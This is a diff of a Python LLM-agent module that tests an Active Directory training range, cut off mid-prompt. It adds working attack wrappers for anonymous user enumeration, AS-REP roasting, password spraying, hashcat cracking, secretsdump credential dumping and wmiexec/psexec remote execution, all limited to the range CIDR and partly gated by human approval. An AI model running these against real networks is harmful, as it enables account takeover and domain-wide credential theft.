@@ -7,9 +7,16 @@ QA Agent —— 靶場部署後的驗證/測試/除錯代理 (constrained tool c
 
 設計:
   - LLM 負責**編排** (下一步測什麼、失敗要不要 debug) 與**摘要** (寫人類可讀報告)。
-  - 工具負責**確定性判定** (regex verdict)。LLM 不做底層 pass/fail。
-  - 每個工具**參數化且鎖定 range 網段** (_assert_in_range),LLM 不能自由指定目標。
-  - HITL: 測試前確認範圍、debug 前確認、破壞性操作前確認。
+  - 有 manifest 時,封裝好的工具 (test_vuln 等) 做**確定性判定** (regex verdict),
+    LLM 直接採信,不做底層 pass/fail。
+  - 唯一的硬限制是**目標鎖定 range 網段** (_assert_in_range) —— 不管走哪個工具,IP
+    一律被檢查是否落在 range CIDR 內,範圍外一律 [BLOCKED]。除此之外,LLM 有相當高的
+    自由度: 可以用 run_tool 自己組偵察/驗證指令 (不必受限於預先寫好的 id→testcase
+    對照表)、用 crack_hash 在本機對拿到的 hash 做真正的離線破解 (kerberoast/AS-REP,
+    自動找系統上的 rockyou.txt)、用 web_fetch_range 瀏覽 range 內主機的 web 服務做偵察。
+    這些是「怎麼做」交給 LLM 判斷,「能不能碰這個目標」交給工具層強制的分工。
+  - HITL: 測試前確認範圍、debug 前確認、破壞性操作前確認 (password_spray 等有鎖帳/
+    帳號風險的動作)。
 
 黑箱 / 白箱:
   --mode blackbox  只用 QA 犧牲帳號 (模擬攻擊者初始存取),測「打得通嗎」。
@@ -41,7 +48,9 @@ import json
 import os
 import re
 import shutil
+import socket
 import subprocess
+from datetime import datetime, timezone
 from typing import Any, Literal, Optional
 
 from pydantic import BaseModel, Field
@@ -208,12 +217,306 @@ def list_planted_vulns() -> str:
     return json.dumps(out, ensure_ascii=False)
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+# 初始存取偵察 (無 manifest / 沒有給 --qa-user/--qa-pass 時,agent 自己找路進去,
+# 而不是遇到需要憑證的項目就 skip)
+# ═══════════════════════════════════════════════════════════════════════════
+_COMMON_PASSWORDS = [
+    "Password1", "Welcome1", "Passw0rd!", "P@ssw0rd", "ChangeMe123!",
+    "Summer2024!", "Winter2024!", "Company123!", "P@ssword1", "Qwerty123!",
+]
+
+
+def _enum_users_anon(dc_ip: str, domain: str) -> list[str]:
+    """不需憑證的使用者列舉: 先試匿名 LDAP bind,不行再試 SMB null-session RID cycling。"""
+    users: list[str] = []
+    parts = [p for p in domain.split(".") if p]
+    base = ",".join(f"DC={p}" for p in parts)
+    rc, out, err = _run(["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-b", base,
+                         "(objectClass=user)", "sAMAccountName"])
+    users += re.findall(r"sAMAccountName:\s*(\S+)", out)
+    if not users:
+        rc, out, err = _run(["nxc", "smb", dc_ip, "-u", "", "-p", "", "--rid-brute"])
+        for m in re.finditer(r"\)\s+\S+\\(\S+)\s+\(SidTypeUser\)", out):
+            users.append(m.group(1))
+    return sorted(set(users))
+
+
+def _crack_asrep_builtin(hashes: list[str]) -> Optional[dict]:
+    """用內建的一小份常見密碼清單線上核對 AS-REP hash (需本機有 hashcat)。找不到就回 None,
+    不代表沒發現 —— hash 本身已是可回報的弱點證據,由呼叫端另外回報。"""
+    if not hashes or not shutil.which("hashcat"):
+        return None
+    hashfile, wordfile, potfile = "/tmp/qa_asrep.hash", "/tmp/qa_common.txt", "/tmp/qa_asrep.cracked"
+    try:
+        with open(hashfile, "w") as f:
+            f.write("\n".join(hashes))
+        with open(wordfile, "w") as f:
+            f.write("\n".join(_COMMON_PASSWORDS))
+    except OSError:
+        return None
+    _run(["hashcat", "-m", "18200", hashfile, wordfile,
+          "--potfile-disable", "-o", potfile, "--force"])
+    try:
+        with open(potfile) as f:
+            line = f.readline().strip()
+    except OSError:
+        return None
+    if ":" not in line:
+        return None
+    h, pw = line.rsplit(":", 1)
+    m = re.search(r"\$krb5asrep\$(?:\d+:)?([^@]+)@", h)
+    return {"user": m.group(1) if m else "unknown", "password": pw}
+
+
+@tool
+def enum_users() -> str:
+    """[初始存取偵察 — 第一步,不需任何憑證] 對已知 DC 做匿名 LDAP bind 或 SMB null-session
+    RID cycling,嘗試列舉網域使用者帳號。沒有 --qa-user/--qa-pass 時,遇到需要憑證的檢測項目
+    前應先呼叫這個,而不是直接判定 skip。回傳找到的使用者清單。"""
+    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
+    if not dc:
+        return json.dumps({"status": "error", "evidence": "manifest 無 DC"}, ensure_ascii=False)
+    users = _enum_users_anon(dc["ip"], _MF["ad_domain"])
+    return json.dumps({"status": "ok" if users else "empty", "users": users}, ensure_ascii=False)
+
+
+@tool
+def asrep_roast_open() -> str:
+    """[初始存取偵察 — 不需憑證] 對 enum_users 列舉到的帳號跑 AS-REP roasting
+    (若尚未列舉過會自動先列舉)。任何關閉 Kerberos pre-auth 的帳號都會回傳可離線破解的
+    $krb5asrep$ hash —— 這本身就是一個可回報的發現。同時會嘗試用內建的常見弱密碼清單
+    線上核對,核對成功會自動把帳密填入 qa_credential,後續需要憑證的檢測項目就能直接使用,
+    不必再回報 skip。"""
+    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
+    if not dc:
+        return json.dumps({"status": "error", "evidence": "manifest 無 DC"}, ensure_ascii=False)
+    users = _enum_users_anon(dc["ip"], _MF["ad_domain"])
+    if not users:
+        return json.dumps({"status": "empty",
+                           "evidence": "匿名列舉不到任何使用者,無法嘗試 AS-REP roast"},
+                          ensure_ascii=False)
+    userfile = "/tmp/qa_discovered_users.txt"
+    try:
+        with open(userfile, "w") as f:
+            f.write("\n".join(users))
+    except OSError as e:
+        return json.dumps({"status": "error", "evidence": str(e)}, ensure_ascii=False)
+    argv = ["impacket-GetNPUsers", f"{_MF['ad_domain']}/", "-no-pass",
+            "-usersfile", userfile, "-dc-ip", dc["ip"], "-format", "hashcat"]
+    blocked = _assert_in_range(argv)
+    if blocked:
+        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
+    rc, out, err = _run(argv)
+    hashes = re.findall(r"(\$krb5asrep\$\S+)", out)
+    if not hashes:
+        return json.dumps({"status": "not_vulnerable", "users_tried": users,
+                           "evidence": (out + err)[-300:]}, ensure_ascii=False)
+    cracked = _crack_asrep_builtin(hashes)
+    if cracked:
+        _MF["qa_credential"] = {"username": cracked["user"], "password": cracked["password"],
+                                "domain": _MF["ad_domain"], "kind": "qa_sacrificial",
+                                "sensitive": True, "note": "由 AS-REP roast + 常見密碼核對自動取得"}
+        return json.dumps({"status": "cracked", "username": cracked["user"],
+                           "note": "已自動填入 qa_credential,後續檢測項目可直接使用"},
+                          ensure_ascii=False)
+    return json.dumps({"status": "hash_only", "hashes": hashes[:5], "users_tried": users,
+                       "note": "已拿到 AS-REP hash,本身即為可回報的弱點 "
+                               "(帳號未強制 Kerberos pre-auth)。內建清單沒核對出明文,"
+                               "若仍需憑證可再呼叫 password_spray (需人工核准)。"},
+                      ensure_ascii=False)
+
+
+@tool
+def password_spray(users: list[str]) -> str:
+    """[初始存取偵察 — 有鎖帳風險,需人工核准] 對指定使用者清單,用內建一組極常見密碼
+    逐一嘗試,每個帳號每個密碼只試一次以降低鎖帳風險,找可用的初始憑證。
+    只在 enum_users / asrep_roast_open 都沒能取得憑證、但確實需要驗證身分的檢測項目時才用。
+    找到有效帳密會自動填入 qa_credential 供後續檢測使用。
+    users 用 enum_users 回傳的清單,不要自己編。"""
+    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
+    if not dc:
+        return json.dumps({"status": "error", "evidence": "manifest 無 DC"}, ensure_ascii=False)
+    if not users:
+        return json.dumps({"status": "error", "evidence": "users 為空,先呼叫 enum_users"},
+                          ensure_ascii=False)
+    userfile = "/tmp/qa_spray_users.txt"
+    try:
+        with open(userfile, "w") as f:
+            f.write("\n".join(users))
+    except OSError as e:
+        return json.dumps({"status": "error", "evidence": str(e)}, ensure_ascii=False)
+    for pw in _COMMON_PASSWORDS:
+        argv = ["nxc", "smb", dc["ip"], "-u", userfile, "-p", pw]
+        blocked = _assert_in_range(argv)
+        if blocked:
+            return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
+        rc, out, err = _run(argv)
+        m = re.search(r"\[\+\]\s+\S+\\(\S+):", out)
+        if m:
+            user = m.group(1)
+            _MF["qa_credential"] = {"username": user, "password": pw, "domain": _MF["ad_domain"],
+                                    "kind": "qa_sacrificial", "sensitive": True,
+                                    "note": "由 password spray 自動取得"}
+            return json.dumps({"status": "found", "username": user,
+                               "note": "已自動填入 qa_credential,密碼已遮蔽不外露"},
+                              ensure_ascii=False)
+    return json.dumps({"status": "not_found",
+                       "evidence": f"對 {len(users)} 個帳號各試了 {len(_COMMON_PASSWORDS)} 組常見密碼"
+                                   ",1 次/組,沒有命中"}, ensure_ascii=False)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# 自由工具呼叫: 不綁 id→testcase 對照表,LLM 自己決定怎麼組指令/怎麼列舉/怎麼破解/
+# 怎麼瀏覽。唯一的硬限制是目標鎖 range 網段。
+# secretsdump/wmiexec/psexec 這類真的登入機器/傾印憑證/執行指令的工具,不放在這裡的
+# 允許清單裡 —— 不是不開放,而是獨立成 secretsdump_dc / wmiexec_run / psexec_run 三個
+# 專用工具 (見下方),每次呼叫都強制 HITL 核准,讓「高風險動作」在工具名稱層級就能被
+# middleware 攔下,不必在 run_tool 裡另外判斷 binary 是否危險。ntlmrelayx (需要常駐監聽、
+# 會主動攔截其他人的流量) 目前不開放,風險模型跟其他工具不同,先不納入。
+# ═══════════════════════════════════════════════════════════════════════════
+ALLOWED_BINARIES = {
+    "nmap", "nxc", "netexec", "ldapsearch", "dig", "nslookup",
+    "smbclient", "rpcclient", "bloodhound-python", "curl",
+    "impacket-GetNPUsers", "impacket-GetUserSPNs", "impacket-rbcd",
+    "impacket-findDelegation", "impacket-lookupsid", "impacket-getTGT",
+    "hashcat", "john",
+    "find", "locate", "which",  # 自我診斷用: 內建候選路徑找不到東西時,自己找 kali 上實際在哪
+}
+
+
+@tool
+def run_tool(binary: str, args: list[str]) -> str:
+    """[自由組指令] 當現成的封裝工具 (enum_users / test_vuln / generic_ad_audit ...)
+    不夠用、你想自己決定怎麼列舉/怎麼查/怎麼驗證時用這個,不必受限於預先寫死的
+    id→testcase 對照表。
+    binary 必須在允許清單內: nmap, nxc/netexec, ldapsearch, dig, nslookup, smbclient,
+    rpcclient, bloodhound-python, curl, impacket-GetNPUsers/GetUserSPNs/rbcd/
+    findDelegation/lookupsid/getTGT, hashcat, john。
+    想真的登入機器/拿 shell/傾印憑證,改用 secretsdump_dc / wmiexec_run / psexec_run
+    (這三個每次都需要人工核准,不能透過 run_tool 繞過)。
+    args 中任何看起來像 IP 的字串,都會被檢查是否落在 range 網段內,不在範圍內直接
+    [BLOCKED] 拒絕執行 —— 這是唯一的硬限制,其餘怎麼組完全由你判斷。
+    回傳 returncode / stdout / stderr (截斷)。"""
+    if binary not in ALLOWED_BINARIES:
+        return json.dumps({"status": "denied",
+                           "evidence": f"binary '{binary}' 不在允許清單: {sorted(ALLOWED_BINARIES)}"},
+                          ensure_ascii=False)
+    argv = [binary] + [str(a) for a in args]
+    blocked = _assert_in_range(argv)
+    if blocked:
+        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
+    rc, out, err = _run(argv)
+    return json.dumps({"status": "ok", "returncode": rc, "cmd": " ".join(argv),
+                       "stdout": out[-4000:], "stderr": err[-1000:]}, ensure_ascii=False)
+
+
+_WORDLIST_CANDIDATES = [
+    "/usr/share/wordlists/rockyou.txt",
+    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
+    "/opt/wordlists/rockyou.txt",
+    os.path.expanduser("~/wordlists/rockyou.txt"),
+]
+
+_HASHCAT_MODES = {"asrep": "18200", "kerberoast": "13100", "ntlm": "1000", "ntlmv2": "5600"}
+
+
+@tool
+def crack_hash(hash_type: str, hashes: list[str], wordlist: str = "") -> str:
+    """[本地離線破解] 對已取得的 hash (asrep_roast_open 或 run_tool 跑 kerberoast 拿到的
+    $krb5tgs$/$krb5asrep$,或其他管道拿到的 NTLM/NTLMv2) 在本機用 hashcat 做真正的離線
+    密碼破解,不是只對幾個常見密碼做形式檢查。
+    hash_type: "asrep" | "kerberoast" | "ntlm" | "ntlmv2"。
+    wordlist: 指定路徑就用指定的;留空會自動找幾個常見的 rockyou.txt 位置,找不到才退回
+    內建的一小份常見密碼清單 (效果有限)。attack host 是 kali,如果這裡列的候選路徑都沒中,
+    不要就這樣算了 —— 自己用 run_tool 呼叫 find/locate (例如
+    `find /usr/share -iname "*.txt" -path "*wordlist*"` 或
+    `locate rockyou.txt`) 去 kali 常見的字典/工具存放位置 (/usr/share/wordlists/,
+    /usr/share/seclists/,/usr/share/john/) 找找看實際路徑在哪,找到後再把正確路徑傳進
+    wordlist 參數重跑一次。
+    破到的帳密會自動填入 qa_credential,後續需要憑證的檢測項目可以直接使用。"""
+    mode = _HASHCAT_MODES.get(hash_type)
+    if not mode:
+        return json.dumps({"status": "error",
+                           "evidence": f"未知 hash_type '{hash_type}',可用: {list(_HASHCAT_MODES)}"},
+                          ensure_ascii=False)
+    if not shutil.which("hashcat"):
+        return json.dumps({"status": "error", "evidence": "hashcat not found on attack host"},
+                          ensure_ascii=False)
+    if not hashes:
+        return json.dumps({"status": "error", "evidence": "hashes 為空"}, ensure_ascii=False)
+    wl = wordlist or next((w for w in _WORDLIST_CANDIDATES if os.path.exists(w)), None)
+    used_builtin = False
+    if not wl:
+        wl = "/tmp/qa_common.txt"
+        used_builtin = True
+        try:
+            with open(wl, "w") as f:
+                f.write("\n".join(_COMMON_PASSWORDS))
+        except OSError as e:
+            return json.dumps({"status": "error", "evidence": str(e)}, ensure_ascii=False)
+    hashfile, potfile = "/tmp/qa_crack.hash", "/tmp/qa_crack.cracked"
+    try:
+        with open(hashfile, "w") as f:
+            f.write("\n".join(hashes))
+        if os.path.exists(potfile):
+            os.remove(potfile)
+    except OSError as e:
+        return json.dumps({"status": "error", "evidence": str(e)}, ensure_ascii=False)
+    rc, out, err = _run(["hashcat", "-m", mode, hashfile, wl,
+                         "--potfile-disable", "-o", potfile, "--force"])
+    cracked = []
+    try:
+        with open(potfile) as f:
+            for line in f:
+                if ":" in line:
+                    h, pw = line.strip().rsplit(":", 1)
+                    cracked.append({"hash": h[:60], "password": pw})
+    except OSError:
+        pass
+    if cracked and hash_type in ("asrep", "kerberoast"):
+        m = re.search(r"\$krb5(?:asrep|tgs)\$(?:\d+:)?([^@/]+)[@/]", cracked[0]["hash"])
+        user = m.group(1) if m else None
+        if user:
+            _MF["qa_credential"] = {"username": user, "password": cracked[0]["password"],
+                                    "domain": _MF.get("ad_domain", ""), "kind": "qa_sacrificial",
+                                    "sensitive": True, "note": f"由本地 {hash_type} 破解取得"}
+    return json.dumps({"status": "cracked" if cracked else "not_cracked",
+                       "wordlist_used": wl, "used_builtin_wordlist": used_builtin,
+                       "cracked_count": len(cracked), "results": cracked[:20]}, ensure_ascii=False)
+
+
+@tool
+def web_fetch_range(url: str, extra_curl_args: Optional[list[str]] = None) -> str:
+    """[網頁瀏覽 — 僅限 range 內目標] 對 range 內主機的 web 服務 (ADFS/IIS/自架站台/
+    wazuh dashboard/內部工具...) 發 HTTP(S) request 做偵察,例如找登入頁、確認版本、
+    看有沒有暴露的 API 或預設頁面。url 的 host 必須能解析到 range 網段內的 IP,解析不到
+    range 內的目標會被拒絕 —— 這個工具不能拿來瀏覽 range 以外的網際網路。
+    回傳 HTTP header + body (截斷)。"""
+    m = re.search(r"://([^/:]+)", url)
+    host = m.group(1) if m else url
+    try:
+        ip = host if re.match(r"^\d+\.\d+\.\d+\.\d+$", host) else socket.gethostbyname(host)
+    except socket.gaierror:
+        return json.dumps({"status": "error", "evidence": f"無法解析主機 {host}"},
+                          ensure_ascii=False)
+    blocked = _assert_in_range(["curl", ip])
+    if blocked:
+        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
+    argv = ["curl", "-s", "-k", "-i", "--max-time", "20", url] + [str(a) for a in (extra_curl_args or [])]
+    rc, out, err = _run(argv)
+    return json.dumps({"status": "ok", "cmd": " ".join(argv),
+                       "response": out[-4000:], "stderr": err[-500:]}, ensure_ascii=False)
+
+
 @tool
 def generic_ad_audit() -> str:
     """[無 manifest 模式專用] 沒有 range_manifest.json、不知道種了哪些弱點時,
     對已探索到的 DC 跑 qa_testcases 中**全部**已知 AD 弱點檢測項目 (AS-REP roast、
     kerberoast、無簽章 SMB、匿名 LDAP、弱密碼策略、GPP cpassword...等),當成黑箱基線稽核。
-    沒有提供 --qa-user/--qa-pass 的項目會回 skip (該項目需要驗證身分才能測)。
+    在呼叫這個之前,若還沒有憑證,應先用 enum_users / asrep_roast_open (必要時
+    password_spray) 嘗試取得初始存取;仍拿不到憑證的項目才回 skip,並在報告中如實說明
+    「已嘗試但找不到初始存取」而非「未提供憑證」。
     回傳每項 pass/fail/skip + evidence。manifest 存在時不要呼叫這個,改用
     list_planted_vulns + test_vuln。"""
     if not _NO_MANIFEST:
@@ -225,7 +528,8 @@ def generic_ad_audit() -> str:
     for vid, tc in sorted(tcs.TEST_CASES.items()):
         if tc.needs_creds and not have_creds:
             results.append({"vuln_id": vid, "name": tc.name, "status": "skip",
-                            "evidence": "no credential supplied (--qa-user/--qa-pass)"})
+                            "evidence": "no credential — 已嘗試 enum_users/asrep_roast_open"
+                                        "/password_spray 取得初始存取仍未成功"})
             continue
         argv = tc.build_cmd(_MF, {})
         blocked = _assert_in_range(argv)
@@ -383,11 +687,103 @@ def suggest_fix(vuln_id: int, reason: str) -> str:
     }, ensure_ascii=False)
 
 
-QA_TOOLS = [list_planted_vulns, get_range_info, run_validation, test_vuln,
-            bloodhound_verify, whitebox_check_setting, suggest_fix, generic_ad_audit]
+# ═══════════════════════════════════════════════════════════════════════════
+# 高風險驗證工具 (真的登入機器 / 傾印憑證 / 執行指令) —— 每次呼叫都需 HITL 核准。
+# 這些不是「掃描/偵察」,是真的觸碰主機,所以獨立成專用工具 (而非塞進 run_tool 的
+# 允許清單),讓 HITL middleware 用工具名稱就能攔下每一次呼叫,而不必在 run_tool
+# 內部另外判斷 binary 是不是高風險。
+# ═══════════════════════════════════════════════════════════════════════════
+def _qa_or_error() -> tuple[Optional[dict], Optional[str]]:
+    cred = _MF.get("qa_credential") or {}
+    if not cred.get("password") and not cred.get("ntlm_hash"):
+        return None, json.dumps({"status": "error",
+                                 "evidence": "沒有可用憑證 (qa_credential 為空)。先用 "
+                                             "enum_users/asrep_roast_open/crack_hash/"
+                                             "password_spray 拿到憑證再呼叫這個。"},
+                                ensure_ascii=False)
+    return cred, None
 
-# 需要 HITL 確認的工具 (破壞性或會登入機器)
-HITL_TOOLS = {"suggest_fix"}  # test/validate 是唯讀驗證,不需逐次確認
+
+@tool
+def secretsdump_dc(target_ip: str = "") -> str:
+    """[高風險 — 需 HITL 核准] 用 impacket-secretsdump 對目標主機傾印本機 SAM / 網域
+    NTDS.dit (若目標是 DC 且憑證權限足夠)。這是「證明可以拿到全網域憑證」的最終驗證,
+    不是偵察,執行前一定會被要求人工 approve/reject。
+    target_ip 留空預設打 manifest 裡的 DC。需要先有 qa_credential (或更高權限憑證)
+    才會執行,沒有的話回 error,不會自己亂猜密碼。"""
+    cred, err = _qa_or_error()
+    if err:
+        return err
+    dc = next((m for m in _MF["machines"] if m["role"] == "dc"), None)
+    ip = target_ip or (dc["ip"] if dc else "")
+    if not ip:
+        return json.dumps({"status": "error", "evidence": "找不到目標 IP"}, ensure_ascii=False)
+    u, pw, dom = cred.get("username", ""), cred.get("password", ""), cred.get("domain", "")
+    argv = ["impacket-secretsdump", f"{dom}/{u}:{pw}@{ip}"]
+    blocked = _assert_in_range(argv)
+    if blocked:
+        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
+    rc, out, err_out = _run(argv)
+    got_hashes = bool(re.search(r":::\s*$|:\$[A-Za-z0-9]+\$", out, re.MULTILINE))
+    return json.dumps({"status": "dumped" if got_hashes else "failed",
+                       "cmd": " ".join(argv[:-1] + [f"{dom}/{u}:[REDACTED]@{ip}"]),
+                       "evidence": (out + err_out)[-1500:]}, ensure_ascii=False)
+
+
+@tool
+def wmiexec_run(target_ip: str, command: str) -> str:
+    """[高風險 — 需 HITL 核准] 用 impacket-wmiexec 對目標主機用現有憑證執行一條指令
+    (WMI,半互動式)。用來驗證「憑證真的能拿到程式碼執行」,執行前一定會被要求人工
+    approve/reject。command 應該是唯讀/驗證性質的指令 (如 whoami、hostname),不要下
+    破壞性指令 (刪檔、關機、改設定...) —— 這個工具不會另外檢查 command 內容是否安全,
+    人工核准時要自己看清楚 command 是什麼。"""
+    cred, err = _qa_or_error()
+    if err:
+        return err
+    u, pw, dom = cred.get("username", ""), cred.get("password", ""), cred.get("domain", "")
+    argv = ["impacket-wmiexec", "-command", command, f"{dom}/{u}:{pw}@{target_ip}"]
+    blocked = _assert_in_range(argv)
+    if blocked:
+        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
+    rc, out, err_out = _run(argv)
+    return json.dumps({"status": "ok" if rc == 0 else "failed",
+                       "cmd": f"impacket-wmiexec -command {command!r} "
+                              f"{dom}/{u}:[REDACTED]@{target_ip}",
+                       "output": out[-2000:], "stderr": err_out[-500:]}, ensure_ascii=False)
+
+
+@tool
+def psexec_run(target_ip: str, command: str = "") -> str:
+    """[高風險 — 需 HITL 核准] 用 impacket-psexec 對目標主機用現有憑證取得執行權限
+    (服務植入式,比 wmiexec 更侵入性)。command 留空會開互動式 shell (不適合非互動的
+    agent 流程,建議一定要帶 command 明確指定要跑什麼)。同 wmiexec_run,只做唯讀/
+    驗證性質的指令,執行前一定會被要求人工 approve/reject,人工核准時要自己看清楚
+    command 是什麼。"""
+    cred, err = _qa_or_error()
+    if err:
+        return err
+    u, pw, dom = cred.get("username", ""), cred.get("password", ""), cred.get("domain", "")
+    argv = ["impacket-psexec", f"{dom}/{u}:{pw}@{target_ip}"]
+    if command:
+        argv += ["-c", command]
+    blocked = _assert_in_range(argv)
+    if blocked:
+        return json.dumps({"status": "error", "evidence": blocked}, ensure_ascii=False)
+    rc, out, err_out = _run(argv)
+    return json.dumps({"status": "ok" if rc == 0 else "failed",
+                       "cmd": f"impacket-psexec {dom}/{u}:[REDACTED]@{target_ip}"
+                              + (f" -c {command!r}" if command else ""),
+                       "output": out[-2000:], "stderr": err_out[-500:]}, ensure_ascii=False)
+
+
+QA_TOOLS = [list_planted_vulns, get_range_info, run_validation, test_vuln,
+            bloodhound_verify, whitebox_check_setting, suggest_fix, generic_ad_audit,
+            enum_users, asrep_roast_open, password_spray,
+            run_tool, crack_hash, web_fetch_range,
+            secretsdump_dc, wmiexec_run, psexec_run]
+
+# 需要 HITL 確認的工具 (破壞性、鎖帳風險、或真的登入/執行於機器上)
+HITL_TOOLS = {"suggest_fix", "password_spray", "secretsdump_dc", "wmiexec_run", "psexec_run"}
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -411,36 +807,91 @@ class QAReport(BaseModel):
 # ═══════════════════════════════════════════════════════════════════════════
 # Agent 建構
 # ═══════════════════════════════════════════════════════════════════════════
-QA_SYSTEM = """你是靶場 QA 工程師。你的任務是驗證一個 Windows AD 訓練靶場:
-1. 先呼叫 list_planted_vulns 了解種了哪些弱點。
-2. 呼叫 run_validation 確認基礎設施 (DNS/LDAP/SMB/Kerberos) 正常。若基礎設施 fail,先報告,不要繼續測弱點。
-3. 對每個種下的弱點呼叫 test_vuln (ACL 類用 bloodhound_verify) 確認「真的可被利用」。
-4. 對 fail 的弱點,呼叫 suggest_fix 提出診斷 (這需要人工確認才會實際修)。
-5. 最後輸出結構化 QA 報告。
+QA_SYSTEM = """你是靶場 QA 工程師,對一個 Windows AD 訓練靶場做滲透式驗證。
+你所有工具都是在 **kali attack host** 上執行的 (不是你自己的沙箱)。工具說明裡列的預設
+路徑/候選清單 (例如 crack_hash 找 rockyou.txt) 只是常見猜測,如果都找不到,不要就這樣
+放棄或回報「找不到」—— 用 run_tool 呼叫 find/locate/which 去 kali 上實際找 (例如常見的
+/usr/share/wordlists/、/usr/share/seclists/、/usr/share/john/ 底下),自己判斷該去哪找、
+找到就用,這也是你自主判斷範圍的一部分。
+你有一組工具,怎麼組合、跑幾輪、要不要繞路都由你自己判斷,不是死板的固定順序:
+
+- list_planted_vulns / test_vuln / bloodhound_verify: 對 manifest 中種下的弱點做既定驗證。
+- run_validation: 基礎設施健檢 (DNS/LDAP/SMB/Kerberos)。
+- enum_users / asrep_roast_open / password_spray (需 HITL 核准): 找初始存取。
+- run_tool: 現成工具不夠用時,自己組 nmap/nxc/ldapsearch/impacket-*/hashcat/john 等指令
+  (允許清單見工具說明),不必受限於 id→testcase 對照表。
+- crack_hash: 對拿到的 hash 在本機用真正的字典 (rockyou.txt 等) 做離線破解,不是只核對
+  幾個常見密碼。
+- web_fetch_range: 瀏覽 range 內主機的 web 服務做偵察。
+- secretsdump_dc / wmiexec_run / psexec_run (需 HITL 核准): 真的登入機器、傾印憑證、
+  執行指令 —— 用來對最終「憑證真的能拿到程式碼執行/拿到全網域憑證」做最後一步證明。
+- suggest_fix: 對 fail 的弱點提出診斷建議 (需人工核准才算數,不會自己動手修)。
+
+怎麼跑由你自己決定,不是死板的固定順序,也不需要每一步都停下來問。原則是:
+**自己不斷推理、不斷嘗試下一個合理的工具呼叫,一路做到你真的想不出還能做什麼、或
+剩下的動作都需要人工核准為止,才需要停下來跟人類報告 / 等待核准。** 例如:先摸底
+(list_planted_vulns + run_validation),再逐一驗證種下的弱點;遇到卡關 (test_vuln 回
+fail 但你覺得可能只是測試手法不夠) 就自己用 run_tool/crack_hash/web_fetch_range 深入查
+根因,不必等被告知;查出一條可能的攻擊鏈就往下追,直到需要呼叫 HITL 工具
+(password_spray/secretsdump_dc/wmiexec_run/psexec_run) 才停下來讓人核准。不要因為「不確定
+下一步該做什麼」就提早結束並丟回一個籠統的報告 —— 先窮盡你手上所有工具能做的。
+最後輸出結構化 QA 報告。
 
 重要:
-- 工具已經做了確定性的 pass/fail 判定,你直接採信工具回傳的 status,不要自己改判。
-- status=pass 代表弱點可利用;fail 代表種了但打不通 (需 debug);skip 代表無直接測試方法。
-- 你只負責編排順序、判斷失敗原因、寫報告。不要嘗試自由組指令。
-- 全程只針對 manifest 內的 range 目標。
+- 工具做確定性的 pass/fail 判定 (regex verdict) 時,你直接採信,不要自己竄改。
+- status=pass 代表弱點可利用;fail 代表種了但打不通 (可以自己用 run_tool 等再深入 debug
+  找根因);skip 代表無直接測試方法或缺條件。
+- 唯一的硬限制是目標鎖定 manifest 內的 range 網段,工具層會強制擋掉範圍外目標;
+  這個範圍內,想怎麼查、怎麼組指令都可以自己決定。
+- password_spray / secretsdump_dc / wmiexec_run / psexec_run 一定會被要求 HITL 核准,
+  不能想辦法繞過;呼叫前先清楚說明你為什麼需要這一步 (例如已經有哪些跡象顯示可能有效)。
+- 每一步工具呼叫都會被自動記錄 (逐步 log),不需要你自己額外做記錄動作,只要正常呼叫工具。
 """
 
 QA_SYSTEM_NO_MANIFEST = """你是靶場 QA 工程師。這次**沒有 range_manifest.json**
 (可能是對外部/未知環境做稽核,或 manifest 遺失),已由前置步驟對目標網段做 nmap 探索,
 找出 DC 並猜出網域名 (見 get_range_info)。你不知道這個環境「種了哪些弱點」,
-所以改成對已知 AD 弱點清單做一輪黑箱基線稽核:
-1. 先呼叫 get_range_info 確認探索到的 DC / 網域是否合理。
-2. 呼叫 run_validation 確認基礎設施 (DNS/LDAP/SMB/Kerberos) 正常。若基礎設施 fail,先報告,不要繼續。
-3. 呼叫 list_planted_vulns 只是形式確認 (會回 no_manifest),不要期待有種植清單。
-4. 呼叫 generic_ad_audit 對所有已知檢測項目跑一輪。有些項目因為沒有帳密會 skip,如實回報,
-   不要假裝測過。
-5. 最後輸出結構化 QA 報告,status 用 exploitable(pass 且有風險)/not_tested(skip)/error 表示;
-   沒有 planted_but_broken 這個狀態的意義 (沒有「種植」動作),不要用它。
+所以整個流程更接近真實黑箱滲透: 沒有現成清單告訴你答案,自己摸索、自己決定下一步。
+
+你所有工具都是在 **kali attack host** 上執行的。工具說明裡列的預設路徑/候選清單 (例如
+crack_hash 找 rockyou.txt) 只是常見猜測,如果都找不到,不要就此放棄或回報「找不到」——
+用 run_tool 呼叫 find/locate/which 去 kali 上實際找 (常見位置如 /usr/share/wordlists/、
+/usr/share/seclists/、/usr/share/john/),自己判斷該去哪找、找到就用。
+
+你手上的工具 (怎麼組合、跳過哪些、多跑幾輪都自己判斷,不是固定管線):
+- get_range_info / run_validation: 先搞清楚環境、確認基礎設施正常。
+- enum_users: 匿名列舉網域帳號 (不需憑證)。
+- asrep_roast_open: 對列舉到的帳號跑 AS-REP roast (不需憑證);拿到 hash 本身就是可回報
+  的發現,工具也會嘗試用內建常見密碼核對明文。
+- crack_hash: 想用比內建清單更完整的字典破解 (rockyou.txt 等) 就用這個,不必等
+  asrep_roast_open 破不出來才想到。
+- run_tool: 想自己嘗試別的列舉/偵察手法 (例如換一種 LDAP 查詢、跑 nmap 服務版本掃描、
+  查 SMB 共享...) 就用這個自己組指令,不必等被告知。
+- password_spray (需 HITL 核准): enum_users/asrep_roast_open/crack_hash 都拿不到有效憑證、
+  但確實需要驗證身分才能繼續深入時才用,每帳號每密碼只試一次降低鎖帳風險。
+- web_fetch_range: range 內有 web 服務 (dashboard、內部工具、ADFS...) 時可以直接瀏覽偵察。
+- generic_ad_audit: 對已知 AD 弱點清單跑一輪基線掃描,可以早點跑打底,也可以晚點跑補漏。
+- secretsdump_dc / wmiexec_run / psexec_run (需 HITL 核准): 有可用憑證後,想證明「真的能
